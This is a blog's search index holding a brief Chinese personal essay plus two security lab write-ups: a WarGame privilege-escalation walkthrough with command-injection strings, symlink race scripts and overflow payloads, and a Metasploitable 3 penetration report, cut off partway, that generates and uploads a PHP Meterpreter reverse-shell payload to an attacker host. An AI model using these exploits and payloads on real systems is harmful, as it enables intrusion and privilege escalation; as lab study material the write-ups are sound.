<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>随笔</title>
      <link href="/2021/12/17/12.11%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/12/17/12.11%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>十二月初冬的天气，傍晚五六点的光景，正是云霞最好看的时候，夕阳遥遥悬在天边，飘着几朵碎云，被染成金红金红的，金得璀璨夺目，红得明艳动人</p><p>但这是一种，没有意义的美</p><p>没有意义在哪？</p><p>没有意义在，我既没有值得分享的人，也不想驻足拍下来把这一刻留住</p><p>追过一两个女生，好像就只有我在认认真真地喜欢，试图把一半生活分给对方</p><p>像个长不大的孩子，交到了个好朋友就固执地想把自己一半的玩具分给对方</p><p>人总是会长大的，对吧？</p><p>你看，我就学会把这些片刻写下来，而不是再去试图告诉你</p><p>尽管在我喜欢你的时候，我真的很想让你知道</p><p>今天的晚霞很美，虽然它跟昨天前天，明天后天，或者无数个以前以后并没有什么不同</p><p>它一点都不特别</p><p>只是我吹着晚风，迎着人潮汹涌，孤零零走在街上，转头看向那晚霞的时候</p><p>突然就很想你</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WarGame闯关笔记</title>
      <link href="/2021/12/17/WarGame/"/>
      <url>/2021/12/17/WarGame/</url>
      
        <content type="html"><![CDATA[<h1>WarGame简介</h1><p><a href="https://box.nju.edu.cn/d/10484f123139461d9412/">虚拟机及题目链接</a></p><p>WarGame提供的虚拟机镜像是一个基于 Linux 的漏洞挖掘的练习闯关平台。闯关者需要从中找到漏洞并突破权限。相信在完成该平台的练习后，你将对漏洞挖掘的原理有一个较为透彻的理解，并掌握漏洞挖掘的基本方法。</p><p>该平台的每一个关卡对应一个名为 levelXX 的账号，密码与账号名相同。在完成每一关 的 题 目 之 前 ， 你 需 要 用 对 应 的 账 号 登 录 系 统 。 每 个 关 卡 的 题 目 对 应 的 文 件 都 放 在 /home/flagXX 目录中。例如，第一关的账号名是 level01，密码也是 level01，如果这个关卡 有需要攻击的包含漏洞的程序，那么相应的程序就放在/home/flag01 目录中。每个关卡的内 容介绍和相关程序的源代码可以在本实验讲义后面对应的 Level 小节中获得。<br>/home/flagXX 目录中的程序具备 SUID 权限。例如在关卡 level01 中，用 level01 账号登 录进系统，然后执行/home/flag01/flag01，程序将以 flag01 的身份运行。当你利用该程序的 漏洞提升自己的权限后，你的身份就将变为 flag01。提权成功后，你需要执行/bin/getflagXX 程序（对本例来说，就是执行/bin/getflag01），如果你确实是以 flagXX 的身份运行该程序， 就将获得提示：“Congratulation! The flag is xxx-xxx”，否则获得的提示为：“Wrong, You are in  a  non-flag  account”。每个关卡的最终目的就是利用程序漏洞提升自己的权限，然后想办 法执行/bin/getflagXX 程序并获得 flag。</p><h1>Level00</h1><p>查找具有SUID权限的程序，找到 /bin/…/flag00: find / -perm /4000</p><p>PS：老师是不是发虚拟机之前调用了flag00，历史指令按两下就出现了flag00，不过这大概不能算是另一种做法吧~</p><p><img src="https://s2.loli.net/2021/12/17/8OpRzalEdNQXHcm.png" alt="00"></p><h1>Level01</h1><ol><li>在用户目录下创建符号链接echo, 链接到getflag: ln -s /bin/getflag01 ~/echo</li><li>将自己的用户目录添加到环境变量中: export PATH=/home/level01/:$PATH</li><li>执行flag01, 它会帮我们运行 /bin/getflag01</li></ol><p><img src="https://s2.loli.net/2021/12/17/sV9kgcCtlev1Eox.png" alt="01"></p><h1>Level02</h1><ol><li>修改用户名, 使其闭合前一个语句并在后面执行getflag: export USER=“name &amp;&amp; /bin/getflag02 &amp;&amp;”</li><li>执行flag02</li></ol><p><img src="https://s2.loli.net/2021/12/17/eiB3xrV5taovC4M.png" alt="02"></p><h1>Level03</h1><ol><li>在用户目录下写一个getflag( /bin/getflag03 &gt; ~/flag), 将它拷贝到漏洞目录下</li><li>等待一会crontab执行, 查看获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/XxwEAyrfPTRWchu.png" alt="03"></p><h1>Level04</h1><ol><li>在用户目录下创建链接至/home/flag04/token</li><li>执行flag04, 查看token</li><li>切换到用户flag04, 执行/bin/getflag04</li></ol><p><img src="https://s2.loli.net/2021/12/17/43lnuvaASCTp7mK.png" alt="04"></p><h1>Level05</h1><ol><li>将压缩包解压到用户目录下: tar zxvf backup-2017.tar.gz -C ~/</li><li>使用ssh密钥登录flag05: ssh -i .ssh/id_rsa <a href="mailto:flag05@192.168.195.128">flag05@192.168.195.128</a></li><li>运行/bin/flag05获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/5zaHnPuKIGVdlhJ.png" alt="05"></p><h1>Level06</h1><ol><li>查看/etc/passwd, 发现flag06密码的密文存在了这里</li><li>使用kali的john插件进行破解, 得到flag06的密码 ftc</li><li>登录用户flag06, 运行/bin/getflag06</li></ol><p><img src="https://s2.loli.net/2021/12/17/JIARGCDTc7Y5kKg.png" alt="06"></p><h1>Level07</h1><ol><li>index.cgi监听端口8888, CGI采用get方法响应请求, 该程序传输 Host参数</li><li>构造语句闭合ping命令( ||/bin/getflag07)</li></ol><p><img src="https://s2.loli.net/2021/12/17/2Xz7KtonCUbvw1O.png" alt="07"></p><h1>Level08</h1><ol><li>使用nc将capture.pcap传到kali:<ul><li>靶机 nc -lp 4455 &lt; capture.pcap -q 1</li><li>攻击机 nc -nv 192.168.1.233 4455 &gt; cap.pcap</li></ul></li><li>使用Wireshark进行分析, 追踪TCP流, 得到Password: backd00Rmate</li><li>登录flag08, 执行/bin/getflag08得到flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/irc9RutBzyMflPw.png" alt="08"></p><h1>Level09</h1><ol><li><p>注意到代码</p><p><code>$contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);</code></p><p>preg_replace第一参数使用了**/e模式**，preg_replace的第二个参数会作为代码执行。</p></li><li><p>用php中的system函数执行外部的shell命令，将<code>[email &quot;&#123;$&#123;system(getflag)&#125;&#125;&quot;]</code>写入/tmp/atk</p></li><li><p>./flag19 /tmp/atk 获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/xtDB1MIp5dhWG6j.png" alt="09"></p><h1>Level10</h1><ol><li><p>flag10程序判断用户是否拥有读该文件的权限, 如果有, 通过18888端口发送给指定host</p></li><li><p>kali机永久监听18888端口, 并将内容输出到log: ncat -lp 18888 -k &gt;&gt; log</p></li><li><p><a href="http://xn--switch-of8i52at7oc26duqa348pbqlt0g.sh">编写条件竞争脚本switch.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line"> ln -s /home/level10/null /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line"> ln -s /home/flag10/token /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p><a href="http://xn--start-by5hv20kj82bz1djuwxpt.sh">编写运行脚本start.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">/home/flag10/flag10 /home/level10/fake 192.168.1.114</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p><a href="http://xn--1switch-hc5k0ou4pznijkao938bxh2attx.sh">以1优先级后台运行switch.sh</a>, <a href="http://xn--19start-hc5k1ou4ppz9lsgyavou.sh">以19优先级运行start.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nice -n1 sh switch.sh &amp;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nice -n19 sh start.sh</span></span><br></pre></td></tr></table></figure></li><li><p>在kali机查看log, 得到token( b3c5-6d82-7sfc), 登录flag10, 获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/cPBrLyX13I879Vw.png" alt="10"></p><h1>Level12</h1><ol><li>连接50000端口的lua服务： nc -nv 127.0.0.1 50000</li><li>输入指令闭合语句，获得flag： ; /bin/getflag12 &gt; ~/flag; #</li></ol><p><img src="https://s2.loli.net/2021/12/17/f87u1qP3BDGRkSA.png" alt="12"></p><h1>Level13</h1><ol><li>使用gdb调试程序： gdb ./flag13</li><li>在main中打断点： (gdb) b main</li><li>(gdb) display /20i $pc，查看20行汇编</li><li>运行，然后单步调试到 ”=&gt; 0x080484f4 &lt;+48&gt;:    cmp eax, 0x3e8“</li><li>修改寄存器eax的值为0x3e8： (gdb) set $eax=0x3e8</li><li>继续执行得到token（b705702b-76a8-42b0-8844-3adabbe5ac58），登录flag13获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/YIGEpuAU2cn3bm6.png" alt="13"></p><h1>Level14</h1><ol><li>运行flag14，观察发现加密算法是 str[i] += i;</li><li>将加密的token进行解密，得到 318d229.998d.5f</li><li>登录flag14，获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/WIqh7TVeHaybcUL.png" alt="14"></p><h1>Level16</h1><ol><li><p>编写脚本 /tmp/getflag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">/bin/getflag16 &gt; /tmp/flag</span><br></pre></td></tr></table></figure></li><li><p>写一个html表单，在username中提交 &quot;;a=/tmp/getflag;${a,};</p></li><li><p>查看 /tmp/flag 获得 flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/IKbFR3rsEUimOtk.png" alt="16"></p><h1>level19</h1><ol><li><p>编写脚本，fork一个子进程，然后父进程退出，子进程执行 /home/flag19/flag19</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">char</span>* args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/getflag19&gt;/tmp/flag_19&quot;</span>, <span class="literal">NULL</span>&#125;;  </span><br><span class="line">    <span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">         execve(<span class="string">&quot;/home/flag19/flag19&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;编译链接执行，查看输出获得flag</span><br></pre></td></tr></table></figure></li><li><p>编译链接执行，查看输出获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/JHGR3MuEAkh9mFn.png" alt="19"></p><h1>Level20</h1><ol><li><p>输入65个’a’给flag20程序，造成数组越界，修改modified的值不为0，获得flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..64&#125;;<span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&#x27;a&#x27;</span> &gt;&gt; /tmp/overflow20;<span class="keyword">done</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /tmp/overflow20 | ./flag20</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/23twKc1QB9SWaVn.png" alt="20"></p><h1>Level21</h1><ol><li><p>越界后修改modified为0x56575859 (也就是 VWXY)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./flag21 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYXWV</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/Fb864t9OyxkKpe7.png" alt="21"></p><h1>Level22</h1><ol><li><p>编写添加环境变量的脚本 /tmp/atk22.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;export NJUCS=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&#x27;&quot;</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译运行，将输出结果添加到 ~/.bashrc 中，刷新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc /tmp/atk22.c -o /tmp/atck22$ /tmp/atk22 &gt;&gt; ~/.bashrc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>运行 ./flag22 ，获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/Oswi9ESBJHWjD2h.png" alt="22"></p><h1>Level23</h1><ol><li><p>(gdb) x win 查看win函数地址，为 0x804846b</p></li><li><p>编写/tmp/atk23.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&quot;</span>, <span class="number">0x6b</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构造payload，运行</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/a4OvYFqQZA1uxRP.png" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次完整的渗透测试</title>
      <link href="/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>靶机：metasploitable 3，有许多漏洞供练习，并藏有15个隐藏彩蛋，老师发的镜像删去了部分有损坏的flag</p><h1>一、信息搜集阶段</h1><ol><li><p>通过nmap扫描发现window靶机的ip地址<code>10.0.2.4</code>，PS：kali攻击机ip：10.0.2.15</p></li><li><p>启动msfconfig，使用nmap扫描全端口，发现靶机开启了如下端口，及其服务版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -a win08-r2</span><br><span class="line">[*] Added workspace: win08-r2</span><br><span class="line">[*] Workspace: win08-r2</span><br><span class="line">msf &gt; db_nmap -sS -sV -sC -p- -n -v 10.0.2.4</span><br><span class="line">msf &gt; services </span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line">host      port   proto  name        state  info</span><br><span class="line">----      ----   -----  ----        -----  ----</span><br><span class="line">10.0.2.4  21     tcp    ftp         open   Microsoft ftpd</span><br><span class="line">10.0.2.4  22     tcp    ssh         open   OpenSSH 7.1 protocol 2.0</span><br><span class="line">10.0.2.4  80     tcp    http        open   Microsoft IIS httpd 7.5</span><br><span class="line">10.0.2.4  1617   tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  3000   tcp    http        open   WEBrick httpd 1.3.1 Ruby 2.3.1 (</span><br><span class="line">                                           2016-04-26)</span><br><span class="line">10.0.2.4  4848   tcp    ssl/http    open   Oracle Glassfish Application Ser</span><br><span class="line">                                           ver</span><br><span class="line">10.0.2.4  5985   tcp    http        open   Microsoft HTTPAPI httpd 2.0 SSDP</span><br><span class="line">                                           /UPnP</span><br><span class="line">10.0.2.4  8022   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8080   tcp    http        open   Sun GlassFish Open Source Editio</span><br><span class="line">                                           n  4.0</span><br><span class="line">10.0.2.4  8282   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8484   tcp    http        open   Jetty winstone-2.8</span><br><span class="line">10.0.2.4  8585   tcp    http        open   Apache httpd 2.2.21 (Win64) PHP/</span><br><span class="line">                                           5.3.10 DAV/2</span><br><span class="line">10.0.2.4  9200   tcp    wap-wsp     open</span><br><span class="line">10.0.2.4  49153  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49154  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49179  tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  49180  tcp    tcpwrapped  open</span><br></pre></td></tr></table></figure></li></ol><h1>二、漏洞分析与利用阶段</h1><h2 id="（1）WebDAV服务漏洞"><a class="header-anchor" href="#（1）WebDAV服务漏洞">¶</a>（1）WebDAV服务漏洞</h2><p>通过kali提供的WebDAV服务漏洞利用工具DAVTest。该工具会自动检测权限，寻找可执行文件的权限。一旦发现，用户就可以上传内置的后门工具，对服务器进行控制。同时，该工具可以上传用户指定的文件，便于后期利用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root💀kali)-[~]</span><br><span class="line">└─# davtest -url http://10.0.2.4:8585/uploads/                                                              </span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line">NOTE    Random string for this session: TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Creating directory</span><br><span class="line">MKCOL           SUCCEED:                Created http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Sending test files</span><br><span class="line">PUT     php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">PUT     cgi     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cgi</span><br><span class="line">PUT     shtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.shtml</span><br><span class="line">PUT     jhtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jhtml</span><br><span class="line">PUT     aspx    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.aspx</span><br><span class="line">PUT     jsp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jsp</span><br><span class="line">PUT     html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">PUT     txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">PUT     pl      SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.pl</span><br><span class="line">PUT     asp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.asp</span><br><span class="line">PUT     cfm     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cfm</span><br><span class="line">********************************************************</span><br><span class="line"> Checking for test file execution</span><br><span class="line">EXEC    php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">EXEC    cgi     FAIL</span><br><span class="line">EXEC    shtml   FAIL</span><br><span class="line">EXEC    jhtml   FAIL</span><br><span class="line">EXEC    aspx    FAIL</span><br><span class="line">EXEC    jsp     FAIL</span><br><span class="line">EXEC    html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">EXEC    txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">EXEC    pl      FAIL</span><br><span class="line">EXEC    asp     FAIL</span><br><span class="line">EXEC    cfm     FAIL</span><br></pre></td></tr></table></figure><p>检测发现可以上传php文件</p><p>生成攻击载荷并上传：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=6666 -f raw &gt;demon.php</span><br><span class="line"></span><br><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ davtest -url http://10.0.2.4:8585/uploads/ -uploadfile demon.php -uploadloc DavTestDir_12ja05EL/66.php</span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line"> unless  Uploading file</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.0.2.15</span><br><span class="line">LHOST =&gt; 10.0.2.15</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.2.15:8888 </span><br><span class="line">[*] Meterpreter session 1 opened (10.0.2.15:8888 -&gt; 10.0.2.4:49914 ) at 2021-12-22 06:41:03 -0500</span><br></pre></td></tr></table></figure><p>得到Meterpreter，成功！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    detach                    Detach the meterpreter session (for http/https)</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    download      Download a file or 